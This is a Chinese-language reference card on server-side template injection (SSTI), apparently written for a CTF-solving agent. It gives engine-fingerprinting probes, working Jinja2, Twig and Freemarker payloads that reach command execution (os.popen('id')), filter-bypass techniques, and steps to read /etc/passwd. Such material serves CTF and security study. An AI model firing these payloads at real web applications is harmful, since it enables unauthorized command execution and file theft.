---
source_url: knowledge/reference/web/ssti.md
source_title: 模板注入 SSTI 模式（识别/探测/利用）— reviewed solution pattern
source_version: "1.0"
publisher: CTF-Agent reviewed corpus
license: CC-BY-4.0
retrieved_at: 2026-08-31
topic: web
keywords_en: SSTI, server side template injection, template injection, Jinja2, Twig, 模板注入
cwe_id: CWE-1336
---

# 模板注入 SSTI 模式（识别 / 探测 / 利用）

> 本文为通用技术模式卡片，不含任何具体题目的 flag、附件路径、端点地址或原始 payload。

## 核心概念

用户输入被传入服务端模板引擎解析执行（`render_template_string` 一类接口常见）。攻击者通过模板语法读取配置、执行表达式，最终达到**任意文件读取 / 命令执行**。主流引擎：Python（Jinja2、Tornado、Mako）、PHP（Twig、Smarty）、Java（Freemarker、Velocity、Thymeleaf）、Ruby（ERB）。

关键点是**先识别引擎**——不同引擎语法与利用链完全不同，先爆破引擎再构造 payload。

## 关键细节

**探测语法**（目标输入处直接提交）：

| 输入 | 引擎反应 |
|---|---|
| `{{7*7}}` | 回显 `49` → 模板表达式被求值（Jinja2/Twig/Tornado/ERB） |
| `{{7*'7'}}` | Jinja2 回显 `7777777`（字符串重复）；Twig 回显 `49`（数值相乘）→ 区分 Python/PHP |
| `${7*7}` | Freemarker / Thymeleaf / JSP EL |
| `<%= 7*7 %>` | ERB（Ruby） |
| `#{7*7}` | Smarty |

**Jinja2 利用链**（从"任意对象 → object → 全部类 → 可利用类"）：

```jinja
{{config}}                              # 泄露应用配置
{{''.__class__.__mro__[1]}}             # 拿到 object 类
{{''.__class__.__mro__[1].__subclasses__()}}   # 列出所有已加载类
```
命令执行优先用自带全局对象短路：
```jinja
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}} 中找 subprocess/os 相关类再绕
```

**过滤绕过**（Jinja2 常见过滤器）：
- 下划线被过滤：`{{()|attr('__class__')}}` 用 `attr` 过滤器取属性。
- `[]` 被过滤：用 `|attr('__getitem__')` 或 `pop`。
- `class` 关键字被过滤：`|attr('__class__')` 全用 attr 表达。
- 字符串被过滤：`dict(__clas__=x)|join` 拼出 `__class__`（`join` 拼接 key）。
- `{{ }}` 被过滤：尝试 `{% ... %}` 语句块（如 `{% for %}` 循环里放输出）。

**其他引擎**：
- Twig（旧版）：`{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}`；新版本该过滤器被禁，需找别的链。
- Freemarker：`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`。
- 盲 SSTI：无回显时用时间延迟判断，如 Jinja2 `{{config.__class__.__init__.__globals__['os'].system('sleep 5')}}`，或用 `{% for %}` 触发慢执行。

## 常见坑

- 用错引擎语法会直接报错或原样输出——先做引擎指纹（上面表格）再深入。
- Python 2 / 3 的 `__mro__` 链一致但类索引不同，`__subclasses__()` 结果依赖已 import 的模块，位置会变，要动态搜索而非写死下标。
- 沙箱过滤是**字符串级**（大小写、黑名单）还是 **AST 级**（解析后校验）决定绕过难度；AST 级需要换利用思路（如 `format`/`|attr` 拆解）。
- 有些引擎只渲染一次（如 Jinja2 默认不做递归渲染），嵌套模板变量不会二次求值。
- 模板报错信息可能直接回显引擎与版本，是免费的指纹来源。

## 验证方式

1. 先提交 `{{7*7}}` 确认求值；`{{7*'7'}}` 区分语言。
2. 依次探测 `{{config}}` / `{{_self}}` 等引擎内建对象，确认对象可用范围。
3. 逐步构建链并打印中间结果（先 `__class__`、再 `__mro__`、再搜类），不要一次拼到底。
4. 最终执行 `id`/`whoami` 确认命令执行，再读 `/etc/passwd` 验证文件读取；盲场景用 `sleep` 验证。
